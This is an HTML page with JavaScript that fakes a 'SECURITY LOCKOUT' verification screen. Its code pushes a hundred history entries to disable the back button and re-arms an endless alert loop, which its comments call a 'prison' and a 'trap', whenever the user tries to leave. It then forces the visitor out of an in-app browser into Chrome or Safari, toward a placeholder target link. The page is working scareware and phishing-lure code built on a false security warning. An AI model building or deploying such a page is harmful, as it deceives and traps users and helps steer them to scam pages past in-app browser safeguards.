<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
        #box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .btn { background: #fe2c55; color: #fff; padding: 20px 60px; border-radius: 8px; font-weight: 800; font-size: 20px; border: none; }
    </style>
</head>
<body>

    <div id="box">
        <div style="font-size: 24px; font-weight: 900; margin-bottom: 20px;">SECURITY LOCKOUT</div>
        <p style="padding: 0 40px; margin-bottom: 40px; color: #ccc;">Your account session is restricted. Verification is required in a secure system browser to continue.</p>
        <button class="btn" onclick="breakout()">VERIFY NOW</button>
    </div>

<script>
    // 1. SET YOUR TARGET URL HERE
    const myLink = "https://www.google.com"; 

    function breakout() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // THE ANDROID CHROME FORCER
            // This 'intent' tells Android: "Open this in the Chrome App, NOT the current app"
            const chromeIntent = `intent://${myLink.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
            window.location.href = chromeIntent;
        } else {
            // THE iOS SAFARI FORCER
            // iOS is tougher. We trigger a "Window Open" then a "Location Change" 
            // to confuse the WebView into offering the "Open in Safari" banner.
            window.open(myLink, '_blank');
            window.location.assign(myLink);
        }
    }

    // 2. THE INFINITE MODAL TRAP (Blocks X and Back)
    function startPrison() {
        // This stops the UI thread so the 'X' button doesn't respond
        alert("CRITICAL: Manual Verification Required.\n\nClick OK to launch Secure Browser.");
        
        // Try to break out
        breakout();
        
        // Re-arm the trap immediately
        setTimeout(startPrison, 50);
    }

    // 3. ARM THE TRAP ON EXIT ATTEMPTS
    window.onblur = () => { startPrison(); };
    window.onpopstate = () => { startPrison(); };

    // 4. PREVENT THE BACK BUTTON
    window.onload = () => {
        for(let i=0; i<100; i++) {
            history.pushState({locked: true}, "", "#secure_verify_" + i);
        }
    };
</script>
</body>
</html>
